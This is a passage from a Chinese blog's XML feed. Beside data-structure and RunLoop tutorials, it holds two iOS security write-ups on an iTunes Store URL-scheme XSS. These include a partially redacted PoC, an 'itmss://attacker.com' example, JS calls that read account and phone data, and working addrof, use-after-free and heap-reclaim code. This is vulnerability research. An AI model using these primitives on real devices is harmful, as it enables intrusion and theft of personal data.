class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">初始化链表为：</span><br><span class="line">1 2 3 4</span><br><span class="line">在第4的位置插入元素5：</span><br><span class="line">1 2 3 5 4</span><br><span class="line">删除元素3:</span><br><span class="line">1 2 5 4</span><br><span class="line">查找元素2的位置为：</span><br><span class="line">元素2的位置为：2</span><br><span class="line">更改第3的位置上的数据为7:</span><br><span class="line">1 2 7 4</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>客户端XSS</title>
      <link href="/2022/07/21/%E5%AE%A2%E6%88%B7%E7%AB%AFXSS/"/>
      <url>/2022/07/21/%E5%AE%A2%E6%88%B7%E7%AB%AFXSS/</url>
      
        <content type="html"><![CDATA[<h1 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h1><p>自从 iPhone Xs 使用了 A12 芯片正式加入了 PAC，包括老牌的 Pwn2Own 在内的各种 0day 竞赛上就没有出现过成功的挑战，直到 2020 年的天府杯。当时的蚂蚁安全和 360 政企安全分别用两套完全不同的方案实现了远程攻击，在搭载了 iOS 14.2 的系统上通过 Safari 浏览器作为入口，绕过浏览器沙箱执行任意代码并窃取敏感信息。</p><p>绝大多数的 full chain exploit 都是先获取沙箱内任意代码执行，再逃逸沙箱；本文用到链条非常特殊，先绕过沙箱向一个系统自带 App 注入任意 javascript 代码，然后直接在 app 中获取完全的 shellcode 执行，也就是和 App 同等的权限，可以访问 Apple ID、通讯录、摄像头等敏感的信息。</p><p>更为有意思的是，在这个 js 环境中，不仅兼容已有的任何一个 WebKit 漏洞利用（无论是否是 JIT 类型的漏洞），还额外引入了攻击面。靠着额外的攻击面结合多个系统安全机制的绕过，最终可以实现任意代码执行。</p><p>一个漏洞非常有意思，本质上是一个客户端的 XSS。但要找到这个 XSS，不仅 fuzz 行不通，哪怕是代码审计也得看二进制代码，也就是要求同时具备逆向工程和 web 漏洞的背景知识。光是反编译 dyld_shared_cache 就能劝退一大批人。</p><p>输入向量是大家熟悉的 URL scheme。URL scheme 可以从浏览器跳转到本地 app，在跳转前会提示用户。但 iOS 在代码里硬编码了一个信任名单，可以免确认跳转：</p><h3 id="Allow-List-of-MobileSafari"><a href="#Allow-List-of-MobileSafari" class="headerlink" title="Allow List of MobileSafari"></a>Allow List of MobileSafari</h3><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> -[_SFNavigationResult isRedirectToAppleServices(_SFNavigationResult</span><br><span class="line">*<span class="keyword">self</span>, SEL a2)</span><br><span class="line">&#123;</span><br><span class="line">bundle = <span class="keyword">self</span>-&gt;_externalApplication.bundleIdentifier;</span><br><span class="line"><span class="keyword">return</span> [bundle isEqualToString:<span class="string">@&quot;com.apple.AppStore&quot;</span>]</span><br><span class="line">[bundle isEqualToString:<span class="string">@&quot;com.apple.AppStore&quot;</span>]</span><br><span class="line">[bundle isEqualToString:<span class="string">@&quot;com.apple.MobileStore&quot;</span>]</span><br><span class="line">[bundle isEqualToString:<span class="string">@&quot;com.apple.Music&quot;</span>] </span><br><span class="line">[bundle isEqualToString:<span class="string">@&quot;com.apple.news&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这给漏洞的利用带来了很大便利。</p><p>早在 2014 年就有韩国黑客 lokihardt 在 Pwn2Own 上用过这个攻击面，通过一个特殊的 URL 在本地 app 打开了任意网址，结合另一个 WebKit 的 Use-After-Free 漏洞即可在沙箱外运行任意代码。第一步的逃逸很简单：</p><blockquote><p>itmss://attacker.com</p></blockquote><p>当时并没有限制域名，直接给一个 URL 就能打开。这个问题就是CVE-2014-8840。</p><p>之后 iOS 加入了域名白名单。每次启动 iTunes Store 时都会拉取一个 XML 配置文件，只有后缀满足其中 trustedDomains 列表才会打开。然而紧接着又被打了一次，因为 lokihardt 找了个信任域名的 DOM xss。</p><p>一开始准备时也没想到真要搞 iOS。当时同事搞定了一个 iOS 和 mac 通用的 WebKit 读写利用WebAudio 组件，后来用在 macOS 的项目上，需要过沙箱，我就想起这个免确认跳转逃逸的点：</p><blockquote><p>its.detect.openltunes</p></blockquote><p>然而测试发现 mac 上的应用已经换上了 WKWebView，意味着即使跳转过去任意代码执行，权限和 Safari 的无异。</p><h3 id="全局开启-iOS-Mac-的WebView调试"><a href="#全局开启-iOS-Mac-的WebView调试" class="headerlink" title="全局开启 iOS/Mac 的WebView调试"></a>全局开启 iOS/Mac 的WebView调试</h3><p>全局调试工具起到很大用处。随手在控制台里测试了一些代码就找到了一个 UAF。开始逆向代码，又发现 WebView 里隐藏的各种强大的接口，可以直接弹计算器。最后考虑效果最佳化，还是完全使用 iTunes 的漏洞完成了 iOS 的项目利用测试。</p><p>一开始的思路放在信任域的 XSS 上，但被动扫描器看了几天也没进展。又掏出 IDA 在漫天的代码里看，终于在这几个方法里发现了彩蛋。</p><p>· -[SUStoreController handleApplicationURL:]<br>· -[NSURL storeURLType]<br>· -[SUStoreController _handleAccountURL:]<br>· -[SKUIURL initWithURL:]</p><p>iTunes Store 本地有一个逻辑，当 querystring 出现特殊的参数时，URL 的 hostname 就会被忽略掉，而是直接取出参数里的第二个 url，在一个浮层里加载：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">itms://&lt;马赛克&gt;&amp;url=http://www.apple.com</span><br></pre></td></tr></table></figure><br>在这里 URL 仍然具有域名信任检查，但已不要求使用 https，可以中间人了。让人不解的是，在反编译代码里发现了一段神奇的逻辑。当参数是一个 data URI 时，同样认为这是一个受信任的域。</p><p>data URI 可以直接插入任意 html，所以这个点就变成了一个反射型 XSS，还是必须要逆向才能找到的 XSS。</p><p>程序还有一个逻辑是会尝试对 querystring 的参数重新赋值，最终的 data URI 永远会被贴上一个额外的问号字符。如果使用 base64 编码，payload 就会被破坏掉；而 text/plain 不受影响，只是会在 body 结尾多出来一个字符而已。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">String</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toDataURI</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;data:text/html;,&#x27;</span> + <span class="built_in">encodeURIComponent</span>(<span class="variable language_">this</span>).<span class="title function_">replace</span>(<span class="regexp">/[!&#x27;()*]/g</span>, <span class="built_in">escape</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">payload</span>(<span class="params"></span>) &#123;  </span><br><span class="line">  iTunes.<span class="title function_">alert</span>(<span class="string">&#x27;gotcha&#x27;</span>); <span class="comment">// do ya thing</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> data = <span class="string">`&lt;script type=&quot;application/javascript&quot;&gt;(<span class="subst">$&#123;payload&#125;</span>)()&lt;\/script&gt;`</span>.<span class="title function_">toDataURI</span>()</span><br><span class="line"><span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;itms://&lt;redacted&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// part of the PoC is redacted to prevent abuse</span></span><br><span class="line">url.<span class="property">searchParams</span>.<span class="title function_">set</span>(<span class="string">&#x27;url&#x27;</span>, data);</span><br><span class="line">location = url</span><br></pre></td></tr></table></figure><p>因此通过以上简单的参数构造，就可以生成这样的一个特殊的 itms URL，能从 Safari 直接跳转到本地应用并执行任意 js。</p><p>由于漏洞从 iOS 3 引入，直到 iOS 14.4 才被修复，影响范围过于夸张，以上提供的 PoC 并不是完整的。一些关键参数已被删除。</p><p>在 iOS 14 上，这个 iTunes 具有 dynamic-codesigning 权限。有一些 iOS 程序员会误认为只有 WKWebView 才能使用 just-in-time 优化，但是实际上这只跟 JavaScriptCore 当前所在进程是否有特殊的 entitlement 来控制。</p><p>这样一来这个 XSS 之后进入了一个特殊的环境。渲染的控件叫 SUWebView，是过时的 UIWebView 的子类，没有独立的渲染器进程。然而这个环境允许 JIT，所以有机会加载任意 shellcode。任意一个有效的 WebKit 的漏洞都可以在这个 WebView 被利用。</p><p>除此之外，SUWebView 本身用的 JavaScript bridge 引入了新的攻击面，至少在这一步可以直接用 js 获取相当多的信息。</p><p>SUWebView 使用的是过时的 WebScripting API，将 SUScriptInterface 类的方法导出到 js 上下文中。这些 API 被放在全局作用域的 iTunes 命名空间里。<br><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Tunes.systemVersion() <span class="comment">//获取系统版本号</span></span><br><span class="line">iTunes.primaryAccount?.identifier <span class="comment">//获取 App Store 账号的邮箱</span></span><br><span class="line">iTunes.primaryiCloudAccount?.identifier <span class="comment">//获取 iCloud 账号的邮箱</span></span><br><span class="line">iTunes.diskSpaceAvailable() <span class="comment">//存储可用空间</span></span><br><span class="line">iTunes.telephony <span class="comment">//电话号码、运营商等信息</span></span><br><span class="line">iTunes.installedSoftwareApplications <span class="comment">//所有已安装的 app 信息</span></span><br></pre></td></tr></table></figure><br>另外从这个 WebView 向任意域名发起 HTTP 请求，都会带上额外的 AppStore 认证信息，包括 icloud-dsid, x-mme-client-info, x-apple-adsid, x-apple-i-md-m, x-apple-i-md 等。</p><p>利用上述漏洞可以是的Safari绕过验证程序跳转到任意app执行一次触摸操作，多次执行便可通过iMessage向他人发送恶意代码实现传播。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = iTunes.<span class="title function_">softwareApplicationWithBundleID_</span>(<span class="string">&#x27;com.apple.calculator&#x27;</span>)app.<span class="title function_">launchWithURL_options_suspended_</span>(<span class="string">&#x27;calc://1337&#x27;</span>, &#123;&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> iOS </tag>
            
            <tag> 移动应用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>访问控制&amp;蝴蝶效应</title>
      <link href="/2022/07/20/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%9D%B4%E8%9D%B6%E6%95%88%E5%BA%94/"/>
      <url>/2022/07/20/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%9D%B4%E8%9D%B6%E6%95%88%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>在 iOS 有一个藏了十二年的客户端 XSS。在这个特殊的 WebView 环境中，系统将 SUScriptInterface 类下的方法导出到全局上下文中的 iTunes 命名空间，从而让 JavaScript 可以通过 WebScripting API 调用其中的方法。</p><p>这个机制和 Android 上的 addJavaScriptInterface 非常相似，而后者出过很严重的安全问题，即 js 可以使用反射调用到任意的 native 方法，从而远程执行代码。修复的方案是加上一个 @JavascriptInterace 注解来限制可访问的方法。可以看到这里的访问控制起到了很重要的作用。</p><p>然而 iOS 上犯了一个类似的错误，一直藏到了 2020 年。</p><p>与 Android 不同，WebScripting 其实从一开始就考虑了访问控制。文档里明确写道，注入到 js 的对象需要实现 isSelectorExcludedFromWebScript: 方法来判断某个 selector 是否允许调用。默认情况下 -[NSObjectisSelectorExcludedFromWebScript:] 返回 YES，也就是禁止一切调用。开发者根据需要，有选择地放行。</p><p>虽然文档是这么写，实际上到了代码又是另一回事了。这个只有两条指令的方法从 iOS 6 就一直返回 NO，允许任意方法调用：<br><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> +[SUScriptObject isSelectorExcludedFromWebScript:](<span class="type">id</span>, SEL, SEL)</span><br><span class="line">  MOV             W0, #<span class="number">0</span></span><br><span class="line">  RET</span><br></pre></td></tr></table></figure></p><h1 id="对象地址泄漏"><a href="#对象地址泄漏" class="headerlink" title="对象地址泄漏"></a>对象地址泄漏</h1><p>在 Objective-C 里的方法就是给对象发送消息，其独特的语法最后会被编译器翻译成各种 objc_msgSend 函数的调用。如果给一个对象发送了一个不存在的 selector（方法名），运行时就会抛出异常，输出类似如下的错误信息：<br><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unrecognized selector sent to instance <span class="number">0x10b15a470</span></span><br></pre></td></tr></table></figure></p><h5 id="其中的指针一般就是-SELF-对象的堆地址。"><a href="#其中的指针一般就是-SELF-对象的堆地址。" class="headerlink" title="其中的指针一般就是 SELF 对象的堆地址。"></a>其中的指针一般就是 SELF 对象的堆地址。</h5><p>回到 SUScriptInterface 这个类。在 js 里访问 iTunes.window 会走到 -[SUScriptInterface window] 方法，方法的内部会调用一次 SELF.scriptWindowContext 的 tag 方法。</p><p>由于前面提到，iTunes 的业务逻辑并没有限制 js 调用方法的范围，因此这个私有属性的 setter 方法 setScriptWindowContext_ 也可以被调用到。这样以来就可以通过 js 把对应的属性替换成一个不合法的类型，造成 Objective-C 的类型混淆。</p><p>接着用 js 访问 iTunes.window 就会抛出一个 NSException。在这个 WebScripting 环境中，Objective-C 的异常可以被 js 的 catch 语句捕获。这时候异常的文本内容就带上了我们赋值上去的对象的地址，格式化成十六进制。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> saved = iTunes.<span class="title function_">scriptWindowContext</span>()</span><br><span class="line">  iTunes.<span class="title function_">setScriptWindowContext_</span>(obj)</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    iTunes.<span class="property">window</span></span><br><span class="line">  &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">debug</span>(e)</span><br><span class="line">    <span class="keyword">const</span> match = <span class="regexp">/instance (0x[\da-f]+)$/i</span>.<span class="title function_">exec</span>(e)</span><br><span class="line">    <span class="keyword">if</span> (match) <span class="keyword">return</span> match[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Unable to leak heap addr&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    iTunes.<span class="title function_">setScriptWindowContext_</span>(saved)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// usage:</span></span><br><span class="line"><span class="title function_">addrof</span>(iTunes.<span class="title function_">makeWindow</span>())</span><br><span class="line"><span class="title function_">addrof</span>(<span class="string">&#x27;A&#x27;</span>.<span class="title function_">repeat</span>(<span class="number">1024</span> * <span class="number">1024</span>))</span><br></pre></td></tr></table></figure><p>马上得到了 addrof 原语。首先篡改私有对象属性造成类型混淆，捕获异常然后解析一下文本就可以了。</p><h5 id="Objective-C-里还直接用指针保存内联信息（如字符串、数字、日期等类型），这个-addrof-原语同样适用于-tagged-pointer。"><a href="#Objective-C-里还直接用指针保存内联信息（如字符串、数字、日期等类型），这个-addrof-原语同样适用于-tagged-pointer。" class="headerlink" title="Objective-C 里还直接用指针保存内联信息（如字符串、数字、日期等类型），这个 addrof 原语同样适用于 tagged pointer。"></a>Objective-C 里还直接用指针保存内联信息（如字符串、数字、日期等类型），这个 addrof 原语同样适用于 tagged pointer。</h5><h1 id="泄漏-dyld-shared-cache-基地址"><a href="#泄漏-dyld-shared-cache-基地址" class="headerlink" title="泄漏 dyld_shared_cache 基地址"></a>泄漏 dyld_shared_cache 基地址</h1><p>iOS 当中所有的系统自带的动态链接库都共享一个随机化偏移，只要泄漏任意一个 library 的基址就可以获取剩下全部。刚才的 addrof 除了能泄露 heap 上对象的地址，针对特定的对象还可以泄露库的基地址。</p><p>在 Objective-C 运行时里，一些特殊的 magic value 并不会产生新的内存分配，而是用特定的符号指针表示。部分 Objective-C 的符号和 js 特殊值对应关系如下：</p><div class="table-container"><table><thead><tr><th>__kCFNumberNaN</th><th>NaN</th></tr></thead><tbody><tr><td>__kCFNumberPositiveInfinity</td><td>Infinity</td></tr><tr><td>__kCFBooleanTrue</td><td>true</td></tr><tr><td></td><td></td></tr><tr><td>__kCFBooleanFalse</td><td>false</td></tr></tbody></table></div><p>泄露以上任意一个 js 值的地址就可以获得左边符号的地址，从而得到 CoreFoundation 和其他任意 framework 的地址。当然，由于目前还没有内存读，这种方式需要根据版本适配偏移量。也可以结合其他 jsc 的漏洞做符号解析，实现更优雅的利用。</p><h1 id="释放后重用"><a href="#释放后重用" class="headerlink" title="释放后重用"></a>释放后重用</h1><p>关键的漏洞出现。由于访问控制简单地将所有的方法导出给 js，一些与对象生命周期相关的方法也暴露了。</p><p>在对象上有一个很特殊，正常情况下不会用到的方法 dealloc。在 ARC（自动对象引用）之前有一段痛苦的时期需要开发者手工管理对象内存分配。Objective-C 使用引用计数，在释放一个对象时需要调用其 release 方法减少一个引用。当引用计数为 0 时，就会走到 dealloc 方法真正地释放内存。</p><p>无论是之前的手动挡 MRC 还是自动挡 ARC，都不会主动用到 dealloc 这个方法。然而现在 js 可以动态调用这个方法，直接把变量对应的对象销毁掉，造成 Use-After-Free。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> w = iTunes.<span class="title function_">makeWindow</span>();</span><br><span class="line">w.<span class="title function_">dealloc</span>();</span><br><span class="line">w <span class="comment">// dangling reference</span></span><br></pre></td></tr></table></figure><p>以上代码先用 makeWindow 创建了一个新的 SUScriptWindow 对象，然后直接释放掉了。但 js 层还保留着原先的地址引用，尝试访问这个变量就会在 objc_opt_respondsToSelector 上造成一个无效的指针解引用。</p><p>这个漏洞的 id 是 CVE-2021-1864，但它从 iOS 6 就被引入了。</p><h2 id="内存占位"><a href="#内存占位" class="headerlink" title="内存占位"></a>内存占位</h2><p>通常对 UAF 漏洞的利用多是在对象释放后抢占分配一个大小一致、结构不同的对象来造成类型混淆。</p><p>在这个环境里很容易想到用 iTunes.make* 系列函数可以分配不同的对象。然而事实是，由于这些对象都以 SUScriptObject 为基类，类型混淆之后不能造成严重的副作用。</p><p>参考之前的文献，如 Modern Objective-C Exploitation 和 Project Zero 的 iMessage 远程攻击，都利用到了 objc_msgSend 的相关特性.</p><p>isa 指针是对象的第一个成员，要想能构建出自定义的值，占位的对象需要满足长度可控和内容可控，一段连续存储的 buffer 是可靠的候选。是不是用 js 里的 ArrayBuffer 或者字符串就行了？之前也提到 WebScripting 会自动把 js 的字符串转换成 NSString。</p><p>然而现实很骨感，JavaScriptCore 用的堆和被释放的对象所在的堆不是同一个。至于 JavaScriptCore 创建出来的 NSString，只是保存了一个指针，具体的字符串内容还是在 jsc 自己的堆里，所以这种方式也不能在 Objective-C 的堆上造成长度可控的分配。</p><p>但有一个很巧妙的函数 -[SUScriptFacebookRequest addmultipartdata:withName:type:]。第一个参数是一个 URL 字符串，当传入一个 data URI 时，就会调用 SUGetDataForDataURL 将其解码成一个 NSData 对象并添加到 SUScriptFacebookRequest 实例上。Data URI 支持用 base64 编码二进制的内容，而生成的 NSData 正好会在 Objective-C 的堆上产生一次长度、内容完全可控的分配。这就形成了一个完美的内存占位原语。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// alloc an SUScriptXMLHTTPStoreRequest</span></span><br><span class="line"><span class="keyword">const</span> w = iTunes.<span class="title function_">makeXMLHTTPStoreRequest</span>();</span><br><span class="line"><span class="keyword">const</span> req = iTunes.<span class="title function_">createFacebookRequest</span>(<span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>);</span><br><span class="line"><span class="comment">// malloc_size(SUScriptXMLHTTPStoreRequest) == 192</span></span><br><span class="line"><span class="keyword">const</span> uri = <span class="title function_">str2DataUri</span>(<span class="title function_">makeStr</span>(<span class="number">192</span>));</span><br><span class="line"><span class="comment">// avoid GC</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">w</span> = w; <span class="variable language_">window</span>.<span class="property">req</span> = req;</span><br><span class="line"><span class="comment">// get a dangling pointer</span></span><br><span class="line">w.<span class="title function_">dealloc</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">  req.<span class="title function_">addMultiPartData</span>(uri, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">w <span class="comment">// boom</span></span><br></pre></td></tr></table></figure><p>用以上代码将被释放的对象重新用 0x41 填充，再次引用这个变量时结果如下：</p><p><img src="https://s2.loli.net/2022/07/20/wF5pOkbsua1RGjS.jpg" alt="图像2022-7-20 18.57.jpg"></p><p>从一个访问控制的方法开始，一共就两行指令的问题接连导致了类型混淆、信息泄漏和释放后重用。有趣的是在官方文档上明明白白写了直接放行会产生安全问题，仍然引入了 bug。也许是开发之初就认为这个环境不会执行第三方脚本，因此不需要严格遵守安全规范。侥幸心理是行不通的。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 二进制安全 </tag>
            
            <tag> iOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RunLoop的基本作用</title>
      <link href="/2022/07/20/RunLoop%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%9C%E7%94%A8/"/>
      <url>/2022/07/20/RunLoop%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%9C%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<ol><li>RunLoop，项目中有用到吗?</li><li>RunLoop内部实现逻辑.</li><li>Runloop和线程的关系.</li><li>timer 与 Runloop 的关系.</li><li>程序中添加每3秒响应一次的NSTimer，当拖动tableview时timer可能无法响应要怎么解决.</li><li>Runloop 是怎么响应用户操作的， 具体流程是什么样的？</li><li>RunLoop的几种状态</li><li>Runloop的mode作用是什么.</li></ol><h1 id="一-RunLoop简介"><a href="#一-RunLoop简介" class="headerlink" title="一.RunLoop简介"></a>一.RunLoop简介</h1><p>运行循环，在程序运行过程中循环做一些事情，如果没有Runloop程序执行完毕就会立即退出，如果有Runloop程序会一直运行，并且时时刻刻在等待用户的输入操作。RunLoop可以在需要的时候自己跑起来运行，在没有操作的时候就停下来休息。充分节省CPU资源，提高程序性能。</p><h1 id="二-RunLoop基本作用："><a href="#二-RunLoop基本作用：" class="headerlink" title="二.RunLoop基本作用："></a>二.RunLoop基本作用：</h1><ol><li>保持程序持续运行，程序一启动就会开一个主线程，主线程一开起来就会跑一个主线程对应的RunLoop,RunLoop保证主线程不会被销毁，也就保证了程序的持续运行</li><li>处理App中的各种事件（比如：触摸事件，定时器事件，Selector事件等）</li><li>节省CPU资源，提高程序性能，程序运行起来时，当什么操作都没有做的时候，RunLoop就告诉CUP，现在没有事情做，我要去休息，这时CUP就会将其资源释放出来去做其他的事情，当有事情做的时候RunLoop就会立马起来去做事情.</li></ol><p>我们先通过API内一张图片来简单看一下RunLoop内部运行原理 <img src="https://s2.loli.net/2022/07/20/hut7CfpQZmrUSKP.png" alt="RunLoop内部运行原理"><br>来自Apple developer网站</p><p>通过图片可以看出，RunLoop在跑圈过程中，当接收到Input sources 或者 Timer sources时就会交给对应的处理方去处理。当没有事件消息传入的时候，RunLoop就休息了。</p><h1 id="三-开启RunLoop"><a href="#三-开启RunLoop" class="headerlink" title="三. 开启RunLoop"></a>三. 开启RunLoop</h1><p>UIApplicationMain函数内启动了Runloop，程序不会马上退出，而是保持运行状态。因此每一个应用必须要有一个runloop， 众所周知，主线程一开起来，就会跑一个和主线程对应的RunLoop，那么RunLoop一定是在程序的入口main函数中开启。</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> main(<span class="type">int</span> argc, <span class="type">char</span> * argv[]) &#123;</span><br><span class="line">        <span class="keyword">@autoreleasepool</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">UIApplicationMain</span>(argc, argv, <span class="literal">nil</span>, <span class="built_in">NSStringFromClass</span>([AppDelegate <span class="keyword">class</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="进入UIApplicationMain"><a href="#进入UIApplicationMain" class="headerlink" title="进入UIApplicationMain"></a>进入UIApplicationMain</h4><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UIKIT_EXTERN</span> <span class="type">int</span> <span class="built_in">UIApplicationMain</span>(<span class="type">int</span> argc, <span class="type">char</span> *argv[], <span class="built_in">NSString</span> * __<span class="keyword">nullable</span> principalClassName, <span class="built_in">NSString</span> * __<span class="keyword">nullable</span> delegateClassName);</span><br></pre></td></tr></table></figure><p>在此发现它返回的是一个int数，那么就对main函数做一些修改<br><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> main(<span class="type">int</span> argc, <span class="type">char</span> * argv[]) &#123;</span><br><span class="line">        <span class="keyword">@autoreleasepool</span> &#123;</span><br><span class="line">            <span class="built_in">NSLog</span>(<span class="string">@&quot;开始&quot;</span>);</span><br><span class="line">            <span class="type">int</span> re = <span class="built_in">UIApplicationMain</span>(argc, argv, <span class="literal">nil</span>, <span class="built_in">NSStringFromClass</span>([AppDelegate <span class="keyword">class</span>]));</span><br><span class="line">            <span class="built_in">NSLog</span>(<span class="string">@&quot;结束&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> re;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>运行程序发现只会打印开始，并不会打印结束，这说明在UIApplicationMain函数中，开启了一个和主线程相关的RunLoop，导致UIApplicationMain不会返回，一直在运行中，也就保证了程序的持续运行。</p><h3 id="康康RunLoop的源码"><a href="#康康RunLoop的源码" class="headerlink" title="康康RunLoop的源码"></a>康康RunLoop的源码</h3><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用DefaultMode启动</span></span><br><span class="line">    <span class="type">void</span> <span class="built_in">CFRunLoopRun</span>(<span class="type">void</span>) &#123;   <span class="comment">/* DOES CALLOUT */</span></span><br><span class="line">        int32_t result;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            result = <span class="built_in">CFRunLoopRunSpecific</span>(<span class="built_in">CFRunLoopGetCurrent</span>(), kCFRunLoopDefaultMode, <span class="number">1.0e10</span>, <span class="literal">false</span>);</span><br><span class="line">            CHECK_FOR_FORK();</span><br><span class="line">        &#125; <span class="keyword">while</span> (kCFRunLoopRunStopped != result &amp;&amp; kCFRunLoopRunFinished != result);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现RunLoop确实是do while通过判断result的值实现的。因此，可以把RunLoop看成一个死循环。如果没有RunLoop，UIApplicationMain函数执行完毕之后将直接返回，也就没有程序持续运行一说了。</p><h1 id="四-RunLoop对象"><a href="#四-RunLoop对象" class="headerlink" title="四. RunLoop对象"></a>四. RunLoop对象</h1><p>Fundation框架 